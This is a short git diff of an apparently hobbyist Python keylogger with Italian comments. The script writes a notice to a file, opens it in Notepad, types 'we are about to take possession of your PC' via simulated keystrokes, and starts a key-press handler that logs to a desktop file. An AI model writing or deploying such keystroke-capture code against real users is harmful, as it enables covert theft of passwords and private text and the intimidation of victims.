@@ -16,16 +16,16 @@ log = os.path.join(desktop_directory, "log.txt")
 with open(log, 'w') as file:
     file.write("printiamo i log\n")
 with open(file_path, 'w') as file:
-    file.write("Cimato ti ha ackerato... quack quack, sei nei guai mascalzone")
+    file.write("Questo è un KeyLogger, ho creato automaticamente questo file -> tutto quello che scrivi è registrato")
 
-sp.Popen(["notepad.exe", file_path])
+sp.Popen(["notepad.exe", file_path]) #apertura autoamtica del file appena creato con notepad
 
 def evil_typewriter(message):
     for character in message:
         con.type(character)
         time.sleep(0.1)
 #trovo un modo per mettere blocco note in primo piano se ho altre finestre aperte
-#evil_typewriter("Stiamo per prendere il possesso del tuo PC!")
+evil_typewriter("Stiamo per prendere il possesso del tuo PC!")
 
 def on_press(key):
     try:
